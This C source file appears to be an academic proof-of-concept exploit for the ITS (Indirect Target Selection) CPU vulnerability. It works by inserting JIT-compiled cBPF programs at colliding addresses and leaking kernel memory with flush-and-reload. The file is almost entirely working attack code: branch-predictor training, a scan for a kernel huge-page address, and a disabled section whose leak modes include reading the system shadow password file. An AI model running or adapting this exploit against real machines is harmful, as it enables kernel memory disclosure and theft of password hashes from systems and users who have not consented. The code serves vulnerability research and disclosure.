/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>
#include <syscall.h>
#include <stdatomic.h>


#include "flush_and_reload.h"
#include "common.h"
#include "cbpf.h"

atomic_int exit_training_program;
atomic_int training_status;
atomic_int exit_gadget_program;



#define DEFAULT_SHADOW_SYMBOL '*'

void * thread_first_half(void * arg) {

    pin_to_core(IDLE_CORE);


    insert_page_size_prog();
    // printf("Page size prog inserted!\n");
    fflush(stdout);

    while (exit_training_program == 0)
    {
        usleep(10);
    }
    // printf("first half: Exiting..\n");
    fflush(stdout);

}

void * thread_do_training(void * arg) {
    struct config * cfg = (struct config *) arg;

    pin_to_core(LEAK_CORE);

    insert_training_branch(cfg->train_address & (0xfffLU), cfg->train_target & (0xfffLU));
    // printf("Training branch inserted\n");
    fflush(stdout);

    // while (training_status == 0)
    // {
    // }



    for (size_t i = 0; i < 2; i++)
    {
        asm volatile(
            "mov $0x220, %%rax\n"
            "syscall\n"
            // "pop %%rsi\npop %%rdi\npop %%rax\n"
            // "jmp start\n"
            :
            :
                "D" (0),		    // rdi (addr)
                "S" (0)		       // rsi (len)  0 == fastest path
            : "r11", "rcx", "rax"
        );
    }

    training_status = 1;

    while (exit_training_program == 0)
    {
        usleep(10);
    }

    // printf("training: Exiting..\n");
    fflush(stdout);
}

void * thread_perform_attack(void * arg) {
    int ch;
    pthread_t tid;
    void *status;
    uint64_t hits;
    uint64_t iter;
    struct config * cfg = (struct config *) arg;

    exit_training_program = 0;
    exit_gadget_program = 0;
    training_status = 0;

    // printf("Waiting for input:\n");
    // fflush(stdout);
    // ch = getchar();


    pthread_create(&tid, NULL, thread_first_half, (void *)&cfg);
    usleep(100);

    pthread_create(&tid, NULL, thread_do_training, (void *)&cfg);

    // printf("Training inserted, waiting for input:\n");
    // fflush(stdout);
    // ch = getchar();

    pin_to_core(LEAK_CORE);
    // training_status = 1;

    while (training_status == 0)
    {
        usleep(10);
    }

    exit_training_program = 1;
    usleep(500);

    // pthread_create(&tid, NULL, thread_insert_gadget, (void *)&cfg);
    insert_double_page_size_prog();
    usleep(1000);


    for (size_t i = 0; i < 1; i++)
    {
         hits = do_flush_and_reload(cfg, 1, 0);
         if (hits) {
            break;
         }
    }


    if (hits) {
        // printf("Hits: %lu/5 ", hits);
        // fflush(stdout);
        return;
    }

    // printf("Done, waiting for input:\n");
    // fflush(stdout);
    // ch = getchar();

    pthread_exit((void *) 1);

    // printf("Now we can leak! User input:\n");
    // fflush(stdout);
    // ch = getchar();

    // while (1)
    // {
    //     // printf("_");
    //     // fflush(stdout);
    //     asm volatile(
    //         // "mov %%rbx, %%r10\n"               // flags
    //         // "mov $0x10, %%r8\n"                // fd
    //         // "mov $0xfffffffffffff000, %%r9\n"  // off OFFSET HAS TO BE page aligned
    //         // "start:\n"
    //         // "push %%rax\npush %%rdi\n push %%rsi\n"
    //         "mov $600, %%rax\n"
    //         "syscall\n"
    //         // "pop %%rsi\npop %%rdi\npop %%rax\n"
    //         // "jmp start\n"
    //         :
    //         : "a" (__NR_mmap),
    //             "D" (0),			   // rdi (addr)
    //             "S" (0)		       // rsi (len)  0 == fastest path
    //             // "d" (cfg->gadget_arg), // rdx (prot) // cfg->ind_map_arg // cfg->fr_buf_kern - 0x18
    //             // "b" ((uint64_t) MAP_PRIVATE | MAP_ANONYMOUS) // flags (fastest path)
    //         : "r8","r9","r10", "r11", "rcx"
    //     );
    //     /* code */
    // }

#if 0

    for (size_t i = 0; i < 2; i++)
    {
         hits = do_flush_and_reload(cfg, 1000, 0);
         if (hits) {
            break;
         }
    }

    if (hits < 600) {
        if (hits > 1) {
            printf("Hits: %lu/1000 (%5.1f%%): Continuing... \n", hits, (double) hits / (double) 1000 * 100);
        }
        pthread_exit((void *) 1);
    }

    printf("\n------------------------------------------------------\n");
    printf("Hits: %lu/1000 (%5.1f%%)\n", hits, (double) hits / (double) 1000 * 100);
    printf("--> The branch is JITTED on a colliding address!\n");
    printf("--> Let's start leaking\n");

    for (size_t i = 0; i < 5; i++) {
        hits = do_flush_and_reload(cfg, 100000, 0);
        printf("Hits: %7lu/100000 (%5.1f%%)\n", hits, (double) hits / (double) 100000 * 100);
    }

    switch (cfg->leak_mode) {
    case 0:
        printf("================ Testing leakage rate ================\n");
        leak_test_leakage_rate(cfg);
        break;

    case 1:
        printf("============== Leaking a dummy secret =================\n");
        leak_dummy_secret(cfg);
        break;

    case 2:
        printf("================ Leaking the shadow file ===============\n");
        leak_shadow_file(cfg, DEFAULT_SHADOW_SYMBOL);
        break;

    default:
        break;
    }

    fflush(stdout);

#endif

}

int reinsert_training_branch(struct config * cfg, int times) {
    pthread_t tid;
    void *status;
    uint64_t idx = 0;


    cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;
    cfg->secret_addr_kern = cfg->ind_map_kern + 0x10000;

    set_load_chain_leak_secret(cfg);

    // comment/uncomment to search with non-zero secret
    *((uint32_t *) (cfg->ind_map + 0x10000)) = 0xdeadLU;
    *cfg->ind_base_addr = (uint64_t) cfg->fr_buf_kern - cfg->base_address_offset - (0xdeadLU << 4);

    for (size_t i = 0; i < times; i++)
    {
        pthread_create(&tid, NULL, thread_perform_attack, (void *)cfg);
        pthread_join(tid, &status);

        if (status == 0) {
            printf("Total reinsertion tries: %lu\n", idx);
            return 0;
        }
        idx++;

        fflush(stdout);
    }

    return 1;

}


void find_hp_kern_address_and_attack(struct config * cfg) {
    uint64_t mem_total = get_mem_total();
    uint64_t mem_used = get_mem_used();
    uint64_t offset;
    uint8_t * huge_page_kern;


    printf("===== Huge-page finding + Colliding cBPF Program ======\n");
    printf("--> We scan the physical map for the huge-page kernel address\n");
    printf("--> At the same time, we reinsert the cBPF with the training branch\n");
    printf("--> until the branch is placed at the correct colliding address\n");

    if (mem_total > (8LU * (1LU << 30))) {
        offset = (mem_total / 10) & ~(HUGE_PAGE_SIZE - 1);
        // never more than 4 GB
        if (offset > 4LU * (1LU << 30)) {
            offset = 4LU * (1LU << 30) & ~(HUGE_PAGE_SIZE - 1);
        }
    } else {
        offset = (mem_used / 4) & ~(HUGE_PAGE_SIZE - 1);
    }

    huge_page_kern = cfg->phys_start + offset;

#ifdef DEBUG
    uint8_t * ind_map_kern_real = (uint8_t *)(virt_to_physmap((uint64_t)cfg->ind_map, (uint64_t) cfg->phys_start));
    printf("   Verified kern address: %p (phys_map start + %2luGB) : %p\n", ind_map_kern_real, (ind_map_kern_real - cfg->phys_start) / (1 << 30), cfg->ind_map);
#endif

    // ------------------------------------------------------------------------
    // Start the huge page search
    uint64_t iter = 0;

    for (; huge_page_kern < cfg->phys_end; huge_page_kern += HUGE_PAGE_SIZE)
    {
        iter++;

        cfg->ind_map_kern = huge_page_kern;

        printf("\rTesting Kernel Huge Page: %p (phys_map start + %2luGB)", huge_page_kern, (huge_page_kern - cfg->phys_start) / (1 << 30));
        fflush(stdout);

        if(reinsert_training_branch(cfg, 10) == 0) {
            return;
        }

    }


}
